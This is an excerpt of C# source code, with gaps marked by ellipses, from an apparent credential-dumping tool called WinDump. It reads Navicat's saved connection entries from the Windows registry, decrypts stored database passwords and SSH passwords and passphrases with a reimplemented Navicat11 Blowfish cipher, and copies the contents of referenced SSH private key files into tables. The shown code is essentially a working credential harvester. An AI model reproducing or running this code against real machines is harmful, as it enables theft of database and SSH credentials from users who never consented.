...
namespace WinDump
{
    ...
    {
        internal static Navicat11Cipher cipher = new Navicat11Cipher();
        ...
        internal static DataTable GetNavicat(out DataTable dtkey)
        {
            ...
            dt.Columns.Add("User");
            dt.Columns.Add("Pwd");
            dt.Columns.Add("SSHHost");
            dt.Columns.Add("SSHPort");
            dt.Columns.Add("SSHUser");
            dt.Columns.Add("SSHPwd");
            dt.Columns.Add("SSHPhrase");
            dt.Columns.Add("SSHKey");
            dtkey = new DataTable();
            dtkey.Columns.Add("Path");
            dtkey.Columns.Add("Content");
            var keyDict = new Dictionary<string, string>();
            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\PremiumSoft", false))
            {
                if (key == null)
                {
                    return dt;
                ...
                foreach(KeyValuePair<string,string>item in names){
                    var regName = item.Key;
                    var typName = item.Value;
                    using (var subkey = key.OpenSubKey(regName+@"\Servers",false))
                    {
                        if(subkey == null)
                        {
                            continue;
                        }
                        foreach (var sername in subkey.GetSubKeyNames())
                        {
                            using (var serkey = subkey.OpenSubKey(sername,false))
                            {
                                if(serkey == null)
                                {
                                    continue;
                                }
                                DumpServer(dt,keyDict, serkey, typName,sername);
                            }
                        }
            ...
            foreach(var item in keyDict){
                dtkey.Rows.Add(item.Key, item.Value);
            }
            return dt;
        }
        internal static void DumpServer(DataTable dt, Dictionary<string, string> keyDict,RegistryKey key,string typName,string sername)
        {
            var host = key.GetValue("Host","");
            var port = key.GetValue("Port","");
            var user = key.GetValue("UserName");
            var pwd = cipher.DecryptString(key.GetValue("Pwd","").ToString());
            var usessh = key.GetValue("UseSSH", 0);
            string sshHost="",sshPort="",sshUser = "",sshPwd = "",sshPhrase = "",sshKey = "";
            if (usessh is int && (int)usessh != 0)
            {
                sshHost = key.GetValue("SSH_Host","").ToString();
                sshPort = key.GetValue("SSH_Port", 0).ToString();
                sshUser = key.GetValue("SSH_UserName", "").ToString();
                sshPwd = cipher.DecryptString(key.GetValue("SSH_Password", "").ToString());
                sshPhrase = cipher.DecryptString(key.GetValue("SSH_Passphrase", "").ToString());
                sshKey = key.GetValue("SSH_PrivateKey", "").ToString();
                if (sshKey.Length != 0 && !keyDict.ContainsKey(sshKey) && File.Exists(sshKey) )
                {
                    keyDict[sshKey] = File.ReadAllText(sshKey);
                }


            }
            dt.Rows.Add(typName,sername, host,port,user,pwd,sshHost,sshPort,sshUser, sshPwd,sshPhrase, sshKey);
        }
    }
    internal class Navicat11Cipher
    {

        private BlowfishNavicat blowfishCipher;
        ...
        public Navicat11Cipher()
        {
            ...
            blowfishCipher = new BlowfishNavicat(sha1.Hash);
        }
        ...
        public string DecryptString(string ciphertext)
        {
            ...
            byte[] ciphertext_bytes = Utils.FromHex(ciphertext);

            byte[] CV = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
            blowfishCipher.Encrypt(CV, BlowfishNavicat.Endian.Big);

            var ret = new MemoryStream();
            int blocks_len = ciphertext_bytes.Length / BlowfishNavicat.BlockSize;
            int left_len = ciphertext_bytes.Length % BlowfishNavicat.BlockSize;
            byte[] temp = new byte[BlowfishNavicat.BlockSize];
            byte[] temp2 = new byte[BlowfishNavicat.BlockSize];
            for (int i = 0; i < blocks_len; ++i)
            {
                Array.Copy(ciphertext_bytes, BlowfishNavicat.BlockSize * i, temp, 0, BlowfishNavicat.BlockSize);
                Array.Copy(temp, temp2, BlowfishNavicat.BlockSize);
                blowfishCipher.Decrypt(temp, BlowfishNavicat.Endian.Big);
                XorBytes(temp, CV, BlowfishNavicat.BlockSize);
                ret.Write(temp, 0, temp.Length);
                XorBytes(CV, temp2, BlowfishNavicat.BlockSize);
            }

            if (left_len != 0)
            {
                Array.Clear(temp, 0, temp.Length);
                Array.Copy(ciphertext_bytes, BlowfishNavicat.BlockSize * blocks_len, temp, 0, left_len);
                blowfishCipher.Encrypt(CV, BlowfishNavicat.Endian.Big);
                XorBytes(temp, CV, BlowfishNavicat.BlockSize);
                ret.Write(temp,0,left_len);
            }

            return Encoding.UTF8.GetString(ret.ToArray());
        }
    }
    internal class BlowfishNavicat
    {
        ...
        public BlowfishNavicat(byte[] UserKey)
        {
